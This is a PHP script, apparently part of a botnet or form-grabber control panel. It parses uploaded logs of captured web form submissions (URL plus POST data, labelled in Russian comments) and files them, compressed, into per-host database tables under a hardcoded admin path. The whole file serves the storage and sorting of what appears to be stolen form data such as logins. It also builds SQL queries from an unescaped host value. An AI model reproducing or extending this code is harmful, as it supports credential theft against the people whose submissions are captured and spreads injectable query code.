<?php

$log = explode("[~]\r\n\r\n", $log);

$var = array();

if(isset($log[0])){	foreach($log as $item){
		$var[0] = explode("[,]\r\n", $item);

        if(count($var[0]) == 5){
	        if(strlen($var[0][4]) > 10240) continue;
	        // echo strlen($var[0][4]) . "\r\n";

	        $var[0][4] = explode('|POST:', $var[0][4], 2);

	        //echo $var[0][4][0] . "\r\n";

	        if(empty($var[0][4][0])) continue; // ссылка
			if(empty($var[0][4][1])) continue; // пост данные

            $host = get_host($var[0][4][0]);
            $hp = mb_substr($host, 0, 2, 'utf8');
            if(!preg_match('~^([a-zA-Z0-9]+)$~', $hp)){            	$hp = 'none';
            }

            //file_put_contents('2.txt', "\r\n  INSERT DELAYED INTO bf_unnecessary_date (host, type, data) VALUES ('".$host."', '5', '".$mysqli->real_escape_string(gzdeflate($item . "[~]\r\n\r\n"))."')\r\n", FILE_APPEND);
            //echo get_host($var[0][4][0]) . "\r\n";
			//$mysqli->query("INSERT DELAYED INTO bf_unnecessary_date (host, type, data, hp) VALUES ('".$host."', '5', '".$mysqli->real_escape_string(gzdeflate($item . "[~]\r\n\r\n"))."', '".mb_substr($host, 0, 2, 'utf8')."')");

		    if(!file_exists('/srv/www/vhosts/adm.piqa.in/cache/unnecessary/' . $hp)){		    	$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$hp.' LIKE adm_unnecessary.bf_unnecessary');
		    	file_put_contents('/srv/www/vhosts/adm.piqa.in/cache/unnecessary/' . $hp, true);
		    }

		    $mysqli->query("INSERT DELAYED INTO adm_unnecessary.bf_".$hp." (host, type, data) VALUES ('".$host."', '5', '".$mysqli->real_escape_string(gzdeflate($item . "[~]\r\n\r\n"))."')");
		    //echo "\r\n";
		}
	}
}

?>